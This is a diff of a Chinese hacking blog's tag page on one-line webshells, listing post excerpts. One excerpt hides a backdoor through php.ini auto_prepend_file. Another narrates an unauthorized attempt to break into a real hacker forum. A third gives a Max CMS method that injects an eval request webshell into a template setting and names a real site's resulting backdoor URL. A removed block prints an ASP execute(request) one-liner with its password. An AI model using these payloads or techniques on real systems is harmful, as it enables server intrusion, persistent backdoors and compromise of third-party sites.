@@ -45,6 +45,99 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
+      <time datetime="2013-07-03T22:30:53.000Z" itemprop="datePublished">
+          2013-07-04
+      </time>
+    
+    
+    | 
+    <a href='/tag/一句话/'>一句话</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1012.seo/">利用php.ini隐藏一句话</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        利用php中的一个自动在文件中增加页眉和页脚的功能，隐藏一句话。   在站点的某一目录（如：根目录）下编辑文件php脚本文件，名称为：info.php，内容如下   &lt;?php    Phpinfo();    ?&gt;    在本地打开如：http://127.0.0.1/info.php    检查系统使用的配置文件      找到并编辑该配置文件   如下行：    auto_prepend_file =test.php&
+      
+      </p>
+      
+      <p>
+          <a href="/1012.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-04-01T00:56:51.000Z" itemprop="datePublished">
+          2013-04-01
+      </time>
+    
+    
+    | 
+    <a href='/tag/一句话/'>一句话</a>,
+    
+    <a href='/tag/xss/'>xss</a>,
+    
+    <a href='/tag/SQL注入/'>SQL注入</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/987.seo/">对国外黑客论坛 hackerstown.com 的一次测试</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p><a href="http://img.cker.in/hackerstown.com_ED8E/clip_image001.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/hackerstown.com_ED8E/clip_image001_thumb.jpg" width="396" height="144" /></a></p>  <p>最近太忙了，一直没更新博客！先谈谈气候吧，尼玛南方冷死了！我现在是出门穿再多都哆嗦啊！</p>  <p>日，你什么时候来啊，我还是喜欢大热天吹电风扇，擦~ 大热天还可以裸睡，多爽！ </p>  <p>好吧，不扯谈了，对于为什么突然日这个站，其实还是前几天在看我网易博客的时候突然又看到之前一老外在&quot;<a href="http://ps.s.blog.163.com/blog/static/89878892201211311548478/">About EvilShad0w Team</a>&quot; 这篇日志下留言并留了个地址，如图：</p>  <p><a href="http://img.cker.in/hackerstown.com_ED8E/clip_image003.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/hackerstown.com_ED8E/clip_image003_thumb.jpg" width="381" height="212" /></a></p>  <p>前几天就看到这条评论，就点开了网址看见是个黑客论坛，版块内容还比较丰富，其中很多文章都还不错，突然试试入侵，于是先看他是什么程序吧。 通过分析论坛结构，确定为“MyBB”，于是通过之前收藏的一个国外exploit 公布站搜索了下这个程序，结果出来了很多 ，有<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>、信息泄露、<a href="http://ha.cker.in/tag/XSS" target="_blank">XSS</a>、远程代码执行。但一一试过，都无效。貌似已经打全补丁了。好吧，该我自己整合的字典上阵了！扫描完后发现路径都是一般常见的路径，我一一点击尝试访问都出现403 Forbidden，在访问其中 xxxx/的时候发现根路径泄露</p>  <p><a href="http://img.cker.in/hackerstown.com_ED8E/clip_image004.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/hackerstown.com_ED8E/clip_image004_thumb.jpg" width="336" height="51" /></a></p>  <p>还有目录遍历，然后再点击三级目录发现上传页面，只能浏览当前目录，并且禁止了上传，只能重命名文件还有写txt文件， 尼玛！ 我通过一个小页面写入txt文件，但是无法重命名，这时候我发给Liuker一起看，我俩啥后缀都试过了就是不能解析，一定是做限制了，在写文件的时候尝试跳目录也没成功，突然想到上传 .htaccess 来解析 jpg类似正常后缀突破，但是测试了下失败！Liuker用他字典扫到两个根目录的无内容PHP页面，通过一句话后门破解也没成功。My God…………<a href="http://img.cker.in/hackerstown.com_ED8E/clip_image005.gif"><img style="display: inline" title="clip_image005" alt="clip_image005" src="http://img.cker.in/hackerstown.com_ED8E/clip_image005_thumb.gif" width="19" height="19" /></a></p>  <p>继续吧，翻了翻当前的目录，发现了有几个压缩文件。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/987.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-12-17T22:28:56.000Z" itemprop="datePublished">
+          2012-12-18
+      </time>
+    
+    
+    | 
+    <a href='/tag/一句话/'>一句话</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/956.seo/">马克思cms后台拿webshell方法</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        马克思cms后台拿webshell方法  这个方法容易引起出错，如果用这个方法建议用最快的速度给恢复。  系统-》站点配置-》模板与路径设置-》模板文件所在文件夹   html  改为     html&quot;%&gt;&lt;%eval request(&quot;123&quot;)%&gt;&lt;%’ 
+
+点 确认更新得到一句话连接地址：http://www.fst0316.com/max/inc/config.asp
+      
+      </p>
+      
+      <p>
+          <a href="/956.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
       <time datetime="2012-07-08T07:24:48.000Z" itemprop="datePublished">
           2012-07-08
       </time>
@@ -80,9 +173,9 @@
     
     
     | 
-    <a href='/tag/一句话/'>一句话</a>,
-    
     <a href='/tag/提权/'>提权</a>,
+    
+    <a href='/tag/一句话/'>一句话</a>,
     
     <a href='/tag/phpmyadmin/'>phpmyadmin</a>,
     
@@ -135,43 +228,10 @@
     </section>
   </article>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-05-18T06:34:04.000Z" itemprop="datePublished">
-          2012-05-18
-      </time>
-    
-    
-    | 
-    <a href='/tag/菜刀/'>菜刀</a>,
-    
-    <a href='/tag/一句话/'>一句话</a>,
-    
-    <a href='/tag/护卫神/'>护卫神</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/425.seo/">突破护卫神的菜刀一句话 & 一句话变形处理</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;    <br />asp的&#160; 密码为x</p>
-      
-      </p>
-      
-      <p>
-          <a href="/425.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
   <nav class="pagination" role="pagination">
     
-    <span class="page-number">Page 1 of 1</span>
-    
+    <span class="page-number">Page 1 of 2</span>
+    <a class="older-posts" href="/tag/一句话/page/2/">Older Posts →</a>
   </nav>
 </main>
 
